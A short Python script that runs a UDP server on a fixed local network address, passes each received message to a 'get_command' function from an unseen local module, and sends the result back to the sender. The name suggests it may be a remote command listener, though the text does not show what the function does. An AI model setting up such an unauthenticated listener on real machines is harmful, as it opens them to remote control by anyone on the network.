import socket
from strin_function import get_command

ip="192.168.43.161"
port=1234

while True:
    serversock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    serversock.bind((ip, port))
    data, addr = serversock.recvfrom(10024)
    print ("Message from {}\n {}".format(addr,data))
    output=get_command(data.decode())
    serversock.sendto(output.encode(),addr)
    print("\t\t\t{}\n\t\t\t {}".format(ip,output))
    serversock.close()